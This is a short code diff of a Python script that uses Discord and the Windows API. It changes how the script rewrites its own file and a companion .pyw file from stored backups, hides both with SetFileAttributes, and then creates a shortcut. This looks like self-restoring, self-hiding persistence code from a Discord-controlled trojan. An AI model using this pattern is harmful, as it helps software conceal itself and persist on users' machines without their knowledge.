@@ -23,6 +23,8 @@ import time
 import ctypes
 import asyncio
 import discord
+import win32con
+import win32api
 import importlib
 
 from ctypes import wintypes
@@ -111,14 +113,14 @@ def _auto_save():
     main_file_path = __file__
     with open(main_file_path, 'w') as f:
         f.write(BACKUP_FILE)
-        attributes = os.stat(main_file_path).st_file_attributes
-        os.chflags(main_file_path, attributes | stat.FILE_ATTRIBUTE_HIDDEN)
+
+    win32api.SetFileAttributes(main_file_path ,win32con.FILE_ATTRIBUTE_HIDDEN)
 
     lib_file_path = LIB + '.pyw'
     with open(lib_file_path, 'w') as f:
         f.write(LIB_BACKUP_FILE)
-        attributes = os.stat(lib_file_path).st_file_attributes
-        os.chflags(lib_file_path, attributes | stat.FILE_ATTRIBUTE_HIDDEN)
+
+    win32api.SetFileAttributes(lib_file_path ,win32con.FILE_ATTRIBUTE_HIDDEN)
 
     create_shortcut()
 
